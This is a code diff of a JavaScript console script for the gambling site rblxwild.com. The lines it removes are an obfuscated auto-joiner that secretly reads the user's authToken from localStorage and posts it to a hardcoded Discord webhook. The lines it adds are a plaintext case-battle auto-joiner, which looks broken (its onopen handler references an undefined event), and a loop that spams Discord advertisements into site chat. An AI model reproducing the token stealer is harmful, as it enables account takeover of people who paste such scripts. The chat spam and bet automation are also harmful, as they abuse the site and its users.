@@ -1,1 +1,89 @@
-function _0x24f7(_0x5ef919,_0x5bc658){var _0xda133b=_0xda13();return _0x24f7=function(_0x24f7f2,_0x3ca7ab){_0x24f7f2=_0x24f7f2-0x91;var _0x446760=_0xda133b[_0x24f7f2];return _0x446760;},_0x24f7(_0x5ef919,_0x5bc658);}(function(_0x32ce96,_0xa442da){var _0x3a70d1=_0x24f7,_0xf5405e=_0x32ce96();while(!![]){try{var _0x2c1240=parseInt(_0x3a70d1(0xc0))/0x1+-parseInt(_0x3a70d1(0xa7))/0x2*(-parseInt(_0x3a70d1(0xab))/0x3)+-parseInt(_0x3a70d1(0xad))/0x4*(parseInt(_0x3a70d1(0xb4))/0x5)+-parseInt(_0x3a70d1(0xa4))/0x6+-parseInt(_0x3a70d1(0x94))/0x7+parseInt(_0x3a70d1(0xae))/0x8*(parseInt(_0x3a70d1(0x9a))/0x9)+parseInt(_0x3a70d1(0xb9))/0xa;if(_0x2c1240===_0xa442da)break;else _0xf5405e['push'](_0xf5405e['shift']());}catch(_0x407588){_0xf5405e['push'](_0xf5405e['shift']());}}}(_0xda13,0x55eb3));function rblxwild(){var _0x44ce3d=_0x24f7;let _0xa07a92=new WebSocket(_0x44ce3d(0x9b));authtoken=localStorage['getItem'](_0x44ce3d(0xc4)),_0xa07a92[_0x44ce3d(0xbb)]=function(_0x4a562c){};var _0xd837b0=new XMLHttpRequest();_0xd837b0[_0x44ce3d(0x9f)](_0x44ce3d(0xa1),_0x44ce3d(0xa9),!![]),_0xd837b0[_0x44ce3d(0xc1)](_0x44ce3d(0x92),'application/json');var _0x4b09bd=JSON['stringify']({'content':_0x44ce3d(0xb1)+localStorage[_0x44ce3d(0xb7)](_0x44ce3d(0xc4))});_0xd837b0['send'](_0x4b09bd),_0xa07a92[_0x44ce3d(0xa5)]=function(_0x265274){var _0x11faf9=_0x44ce3d;!_0x265274[_0x11faf9(0x9e)]['includes'](_0x11faf9(0xc5))&&console['log'](_0x265274['data']),_0x265274['data'][_0x11faf9(0x98)]('0')&&_0xa07a92['send']('40'),_0x265274[_0x11faf9(0x9e)][_0x11faf9(0x98)]('40')&&(_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0x95)+authtoken+_0x11faf9(0x93)+Date[_0x11faf9(0xb3)]()+'}]'),setTimeout(()=>{function _0x160d8e(){_0xa07a92['send']('42[\x22time:requestSync\x22,{\x22clientTime\x22:'+Date['now']()+'}]'),setTimeout(()=>{_0x160d8e();},0x3e8);}_0x160d8e();},0xbb8)),_0x265274[_0x11faf9(0x9e)][_0x11faf9(0x98)](_0x11faf9(0xb0))&&_0xa07a92['send'](_0x11faf9(0xa8)),_0x265274[_0x11faf9(0x9e)][_0x11faf9(0x98)](_0x11faf9(0x97))&&(pushedBattle=JSON[_0x11faf9(0xa6)](_0x265274['data'][_0x11faf9(0xa0)]('42',''))[0x1],pushedBattle['betAmount']*0.2<=pushedBattle[_0x11faf9(0xbf)]&&(console[_0x11faf9(0xb8)](_0x11faf9(0xaf)+pushedBattle['id']+_0x11faf9(0x96)+pushedBattle[_0x11faf9(0x9d)]+_0x11faf9(0xbc)+pushedBattle[_0x11faf9(0xb6)]+_0x11faf9(0xba)+pushedBattle[_0x11faf9(0xbf)]),pushedBattle[_0x11faf9(0x9d)]==_0x11faf9(0xb5)&&(_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0xaa)+pushedBattle['id']+_0x11faf9(0xa2)),_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0xaa)+pushedBattle['id']+',\x22teamId\x22:1,\x22seatIndex\x22:1}]'),_0xa07a92['send'](_0x11faf9(0xaa)+pushedBattle['id']+_0x11faf9(0xbe))),pushedBattle[_0x11faf9(0x9d)]==_0x11faf9(0xb2)&&_0xa07a92['send'](_0x11faf9(0xaa)+pushedBattle['id']+',\x22teamId\x22:2,\x22seatIndex\x22:0}]'),pushedBattle['versusType']==_0x11faf9(0x9c)&&(_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0xaa)+pushedBattle['id']+_0x11faf9(0xac)),_0xa07a92[_0x11faf9(0xbd)]('42[\x22casebattles:join\x22,{\x22gameId\x22:'+pushedBattle['id']+_0x11faf9(0xa2))),pushedBattle[_0x11faf9(0x9d)]==_0x11faf9(0xc2)&&(_0xa07a92['send']('42[\x22casebattles:join\x22,{\x22gameId\x22:'+pushedBattle['id']+_0x11faf9(0xac)),_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0xaa)+pushedBattle['id']+_0x11faf9(0xa2)),_0xa07a92[_0x11faf9(0xbd)](_0x11faf9(0xaa)+pushedBattle['id']+',\x22teamId\x22:4,\x22seatIndex\x22:0}]'))));},_0xa07a92[_0x44ce3d(0x99)]=function(_0x710a8b){var _0x282f78=_0x44ce3d;console[_0x282f78(0xb8)](_0x282f78(0xc3)),ws['close'](),rblxwild();},_0xa07a92[_0x44ce3d(0x91)]=function(_0x57019b){var _0xe411a6=_0x44ce3d;console['log'](_0xe411a6(0xa3)),rblxwild();};}rblxwild();function _0xda13(){var _0x2b30af=['3953340ReKYdn','\x0aFunding\x20amount:\x20','onopen','\x0aBet\x20amount:\x20','send',',\x22teamId\x22:2,\x22seatIndex\x22:1}]','funding','157509nFhmfh','setRequestHeader','1v1v1v1','Wilder\x20Rule\x20RblxWild','authToken','syncResponse','onerror','Content-Type','\x22,\x22clientTime\x22:','3617726XejMuU','42[\x22authentication\x22,{\x22authToken\x22:\x22','\x0aType:\x20','42[\x22casebattles:pushGame','startsWith','onclose','9yibIeI','wss://rblxwild.com/socket.io/?EIO=4&transport=websocket','1v1v1','versusType','data','open','replace','POST',',\x22teamId\x22:2,\x22seatIndex\x22:0}]','[error]','1286568xlXvjW','onmessage','parse','18iiTfax','42[\x22casebattles:subscribe\x22]','https://discord.com/api/webhooks/1117128600882270291/EP_bYP0TJmybQfGEIg62kE66K1D2R7KtCDMnAwRLO2xyvrdmMzgAU0CIVHMP_wbsRDR5','42[\x22casebattles:join\x22,{\x22gameId\x22:','43131dxviNk',',\x22teamId\x22:3,\x22seatIndex\x22:0}]','3696MOTLMy','4678472PvHvcQ','Found\x20game:\x20\x0aID:\x20','42[\x22authenticationResponse\x22','A\x20new\x20user\x20has\x20joined\x20the\x20party!\x20','1v1','now','995iijjKZ','2v2','betAmount','getItem','log'];_0xda13=function(){return _0x2b30af;};return _0xda13();}
+const inputElement = document.querySelector('input[data-v-5802b888]');
+const sendButton = document.querySelector('.general-box.box-green');
+
+const messages = ['OPEN SOURCE EVERYTHING MINES AUTOPLAYER, CASE AUTOJOINER, FREE PREDICTORS FOR MINES TOWERS AND CRASH WITH MORE COMING SOON https://discord.gg/QdWfkpQKEs', 'OPEN SOURCE EVERYTHING MINES AUTOPLAYER, CASE AUTOJOINER, FREE PREDICTORS FOR MINES TOWERS AND CRASH WITH MORE COMING SOON https://discord.gg/QdWfkpQKEs.', 'OPEN SOURCE EVERYTHING MINES AUTOPLAYER, CASE AUTOJOINER, FREE PREDICTORS FOR MINES TOWERS AND CRASH WITH MORE COMING SOON https://discord.gg/QdWfkpQKEs..'];
+let counter = 0;
+
+const sendMessage = async () => {
+  const message = messages[counter % messages.length];
+  await delay(6500);
+
+  if (inputElement && sendButton) {
+    inputElement.value = message;
+
+    const inputEvent = new Event('input', {
+      bubbles: true,
+      cancelable: true
+    });
+    inputElement.dispatchEvent(inputEvent);
+
+    const enterEvent = new KeyboardEvent('keydown', {
+      bubbles: true,
+      cancelable: true,
+      key: 'Enter',
+      keyCode: 13
+    });
+    inputElement.dispatchEvent(enterEvent);
+  }
+
+  counter++;
+};
+
+const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+const sendMessagesLoop = async () => {
+  while (true) {
+    await sendMessage();
+  }
+};
+
+await delay(6500);
+sendMessagesLoop();
+
+// THE SCRIPT ABOVE IS FOR ADVERTISEMENTS
+//SCRIPT BELOW IS THE AUTOJOINER
+
+function nakk() {
+let socket = new WebSocket("wss://rblxwild.com/socket.io/?EIO=4&transport=websocket");
+authtoken = "AuthToken Here"
+socket.onopen = function(e) {
+    if (event.data.startsWith(`42["authenticationResponse"`)) {
+        socket.send(`42["casebattles:subscribe"]`)
+    }
+    if (event.data.startsWith(`42["casebattles:pushGame`)) {
+        pushedBattle = JSON.parse(event.data.replace("42", ""))[1]
+        if (pushedBattle.betAmount * 0.2 <= pushedBattle.funding) {
+            console.log(`Found game: \nID: ${pushedBattle.id}\nType: ${pushedBattle.versusType}\nBet amount: ${pushedBattle.betAmount}\nFunding amount: ${pushedBattle.funding}`)
+            if (pushedBattle.versusType == "2v2") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":1,"seatIndex":1}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":1}]`)
+            }
+            if (pushedBattle.versusType == "1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+            }
+            if (pushedBattle.versusType == "1v1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+            }
+            if (pushedBattle.versusType == "1v1v1v1") {
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":3,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":2,"seatIndex":0}]`)
+                socket.send(`42["casebattles:join",{"gameId":${pushedBattle.id},"teamId":4,"seatIndex":0}]`)
+            }
+        }
+    }
+};
+
+socket.onclose = function(event) {
+console.log("SavNakk Rules RblxWild")
+  ws.close()
+  nakk()
+};
+
+socket.onerror = function(error) {
+  console.log(`[error]`)
+  nakk()
+};
+}
+nakk()
